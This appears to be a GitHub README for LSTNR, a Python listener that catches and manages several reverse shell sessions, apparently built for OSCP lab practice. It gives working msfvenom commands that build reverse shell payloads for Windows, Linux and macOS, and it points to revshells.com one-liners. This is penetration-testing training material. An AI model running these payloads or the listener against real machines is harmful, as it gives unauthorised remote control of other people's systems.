# LSTNR
Python script that receives reverse shell connections from remote devices. 

Remote devices can be managed from a Command Line Interface (CLI).

<img width="550" alt="Screenshot 2025-03-19 at 5 34 42 PM" src="https://github.com/user-attachments/assets/36a56b20-aa1a-4e3d-8605-183dca405d82" />

FYI: Using `rlwrap` will allow your CLI history remain intact while working.

# DISCLAIMER
This is only for testing purposes, not intended for anything illegal. I was testing out ways to manage multiple connections while doing the OSCP labs. #Hobbies

# Download LSTNR

```
git clone github.com/bwithe/LSNTR

cd lstnr
```

# USAGE

1. Start LSTNR
    - `python3 lstnr.py -p <PORT_TO_LISTEN>`
- MENU COMMANDS
    - `ls` : lists connected clients
    - `cs <ID>` : connects to that session
    - `die` : Will terminate all sessions
    - `exit` : will terminate all sessions and stop the script
- SESSION COMMANDS
    - `CTRL+C` or `bs` : backgrounds the active session
    - `die` : while in a session will terminate it

2. Have CLIENT connect to LSTNR
    - Best options that work with `lstnr.py`
        - Windows: `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f exe -o rev.exe`
        - Windows: `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f dll -o rev.dll`
        - Linux: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f elf -o rev.elf`
        - MacOS: `msfvenom -p osx/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f macho -o rev.macho`
    - You can use any of the methods found on https://www.revshells.com
        - Windows: `Powershell #3 (Base64)`
        - Linux: `Bash -i`
        - MacOS: `python3`

# Screenshot examples:

- Starting the listener `python3 lstnr.py -p <port>`

<img width="550" alt="Screenshot 2025-03-19 at 5 34 42 PM" src="https://github.com/user-attachments/assets/4e232d54-4f4f-49a9-a65a-386f07dde910" />

- Press any key to get a list of commands, or type `?` or `help`

![image](https://github.com/user-attachments/assets/cf0217b8-9f47-47b3-80d7-83f928899839)

- List any active sessions with `ls`

<img width="934" alt="Screenshot 2025-03-19 at 5 34 55 PM" src="https://github.com/user-attachments/assets/dd192583-c9b8-443e-af28-ee8782a54267" />

- When a session is established, `ls` will always verify

<img width="932" alt="Screenshot 2025-03-19 at 5 35 01 PM" src="https://github.com/user-attachments/assets/9ecff40b-c14d-4a9a-adf9-cc04fb15e7b4" />

- Connecting to a session with `cs <id>` 
- To update the sessions table, run `whoami` and `hostname`
- When you backgrround the session it will update the session table

<img width="597" alt="Screenshot 2025-03-19 at 5 35 33 PM" src="https://github.com/user-attachments/assets/6017b8e1-3532-4cfd-86bf-2800d119dc39" />

- Background a session with `bs` or `CTRL+C`

![image](https://github.com/user-attachments/assets/0c0453f4-6c1d-4a17-a6d2-88ee862aaabc)

- To see updated session information, type `ls`

<img width="939" alt="Screenshot 2025-03-19 at 5 35 45 PM" src="https://github.com/user-attachments/assets/3f5e4aa9-ebd0-40b3-85a6-0c9276dd9a50" />

- Example of a Windows machine connected

<img width="1171" alt="Screenshot 2025-03-19 at 7 49 26 PM" src="https://github.com/user-attachments/assets/0aa94404-4bfc-4b7c-8f38-d64584329af4" />

<img width="711" alt="Screenshot 2025-03-04 at 8 56 27 PM" src="https://github.com/user-attachments/assets/08819944-4c25-4b30-a104-cec389fb44c4" />

- Kill an individual session `die`

<img width="382" alt="Screenshot 2025-03-19 at 7 50 05 PM" src="https://github.com/user-attachments/assets/7eac2b5f-9670-4f5b-9b93-99c89f98ade6" />

- To kill all sessions, type `die` at the main menu `lstnr$`

![image](https://github.com/user-attachments/assets/ebbc21c5-5481-4c90-8341-275a9bed6f6b)

- To kill `LSTNR$` and all connections, type `exit`

![image](https://github.com/user-attachments/assets/10ebe05b-c320-4465-ab83-a59b0a7f225e)

- LSTNR WILL NOT CLOSE WITH `CTRL+C`

<img width="508" alt="Screenshot 2025-03-19 at 7 50 29 PM" src="https://github.com/user-attachments/assets/74e8f8f9-989b-4284-8e02-cd83cf84c34d" />

- LSTNR also keeps a session and command log

![image](https://github.com/user-attachments/assets/79d08aae-287d-4f66-b9c4-ed97e7f213c7)


# TROUBLESHOOTING
- If a session hangs, background the session with `CTRL+C` and then reconnect.
- Sometimes the `whoami` and `hostname` commannd will hang, just background it and reconnect `cs <id>` and try running it again.
    - If commands stop working all together, reconnect to the session and run `die`, then re-run the reverse shell from the client machine.
- If you are having issues please feel free to reach out
